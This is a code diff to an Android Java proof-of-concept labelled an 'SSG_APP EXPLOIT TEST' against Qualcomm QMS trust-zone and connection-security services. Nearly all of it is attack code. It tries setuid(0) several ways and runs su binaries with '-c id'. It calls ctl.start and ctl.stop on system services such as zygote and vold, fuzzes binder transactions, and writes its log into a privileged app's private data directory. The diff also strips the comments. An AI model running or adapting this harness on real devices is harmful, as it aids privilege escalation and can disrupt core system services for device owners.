@@ -45,6 +45,7 @@ public class Main {
     private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
     private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
+    private static final String LOG_DIR = "/data/data/com.qualcomm.qti.qms.service.trustzoneaccess/";
 
     private static Context sContext;
     private static IServiceManager mServiceManager;
@@ -86,9 +87,7 @@ public class Main {
     };
 
     public static void main(String[] args) {
-        // Obtain a Context for app_process
         try {
-            // Use ActivityThread to get system context
             Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
             Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
             systemMain.setAccessible(true);
@@ -106,11 +105,9 @@ public class Main {
         appendLog("========== SSG_APP EXPLOIT TEST ==========");
         appendLog("Starting at " + new Date().toString());
 
-        // Bind services
         bindServices();
 
         try {
-            // Wait for services to bind (max 10 seconds)
             if (!latch.await(10, TimeUnit.SECONDS)) {
                 appendLog("[!] Bind timeout");
             }
@@ -118,12 +115,10 @@ public class Main {
             appendLog("[!] Bind interrupted");
         }
 
-        // Run tests
         if (mServiceManager != null && mTZService != null) {
             runTests();
         } else {
             appendLog("[!] Services not available, attempting fallback via ServiceManager...");
-            // Fallback: try to get services directly via ServiceManager (hidden API)
             try {
                 IBinder csBinder = ServiceManager.getService("connectionsecurity");
                 if (csBinder != null) {
@@ -145,7 +140,6 @@ public class Main {
             }
         }
 
-        // Finalize and exit
         appendLog("========== TEST COMPLETED ==========");
         appendLog("========================================");
         saveLog();
@@ -430,7 +424,7 @@ public class Main {
         } else {
             appendLog("[FS] /data/local/tmp not exist");
         }
-        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        File download = new File("/sdcard/Download");
         if (download.exists()) {
             File test = new File(download, "poc_write_test.txt");
             try (FileOutputStream fos = new FileOutputStream(test)) {
@@ -492,7 +486,6 @@ public class Main {
             setMethod.setAccessible(true);
             getMethod.setAccessible(true);
 
-            // Try to set a test property
             String prop = "persist.test.poc";
             String val = "1";
             appendLog("  Setting " + prop + "=" + val);
@@ -500,7 +493,6 @@ public class Main {
             String read = (String) getMethod.invoke(null, prop);
             appendLog("  Read back: " + read);
 
-            // Try to set ctl.start for init services (privileged)
             String[] ctlProps = {"ctl.start", "ctl.stop"};
             String[] testServices = {"surfaceflinger", "zygote", "audioserver", "netd", "vold"};
             for (String ctl : ctlProps) {
@@ -522,7 +514,6 @@ public class Main {
     private static void attemptSetuid0() {
         appendLog("[SETUID] Attempting various setuid 0 techniques...");
 
-        // 1. Try via reflection on Process
         try {
             Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
             setuid.setAccessible(true);
@@ -532,11 +523,9 @@ public class Main {
             appendLog("  Runtime.setuid failed: " + e.getMessage());
         }
 
-        // 2. Try via libcore.io.IoUtils or Os
         try {
             Class<?> osClass = Class.forName("libcore.io.Os");
             Method setuidMethod = osClass.getMethod("setuid", int.class);
-            // Need to get instance: OsConstants? Actually Libcore.os
             Class<?> libcore = Class.forName("libcore.io.Libcore");
             Field osField = libcore.getField("os");
             Object os = osField.get(null);
@@ -546,7 +535,6 @@ public class Main {
             appendLog("  Os.setuid failed: " + e.getMessage());
         }
 
-        // 3. Try via android.os.Process.setuid (if exists)
         try {
             Class<?> processClass = Class.forName("android.os.Process");
             Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
@@ -557,9 +545,6 @@ public class Main {
             appendLog("  Process.setuid failed: " + e.getMessage());
         }
 
-        // 4. Try via JNI? Not possible from Java.
-
-        // 5. Try exploiting setuid binaries via File API (if any suid binary exists)
         String[] suidCandidates = {
             "/system/bin/su",
             "/system/xbin/su",
@@ -571,10 +556,8 @@ public class Main {
             File f = new File(path);
             if (f.exists()) {
                 appendLog("  Found " + path + ", canExecute=" + f.canExecute());
-                // Try to execute? But external exec is restricted.
                 try {
                     Process p = Runtime.getRuntime().exec(path + " -c id");
-                    // read output
                     java.io.InputStream is = p.getInputStream();
                     byte[] buf = new byte[1024];
                     int len = is.read(buf);
@@ -591,7 +574,6 @@ public class Main {
 
     private static void fuzzBinderTransactions() {
         appendLog("[FUZZ] Fuzzing binder transactions on system services...");
-        // Try to get some system services
         String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm"};
         for (String svc : services) {
             try {
@@ -602,14 +584,12 @@ public class Main {
                     Parcel data = Parcel.obtain();
                     Parcel reply = Parcel.obtain();
                     try {
-                        // Try to write a generic interface token (might fail)
                         data.writeInterfaceToken("android." + svc + ".I" + svc + "Service");
                         boolean success = binder.transact(code, data, reply, 0);
                         if (success) {
                             appendLog("    Code " + code + " succeeded, reply size=" + reply.dataSize());
                         }
                     } catch (Exception e) {
-                        // ignore
                     } finally {
                         data.recycle();
                         reply.recycle();
@@ -625,14 +605,14 @@ public class Main {
         String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
         final String line = "[" + ts + "] " + msg + "\n";
         logBuilder.append(line);
-        System.out.print(line); // Also print to console
+        System.out.print(line);
     }
 
     private static void saveLog() {
         try {
-            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (dir == null || (!dir.exists() && !dir.mkdirs())) {
-                appendLog("Cannot create Download dir");
+            File dir = new File(LOG_DIR);
+            if (!dir.exists() && !dir.mkdirs()) {
+                appendLog("Cannot create log directory: " + LOG_DIR);
                 return;
             }
             File file = new File(dir, "ssg_app_poc_log.txt");
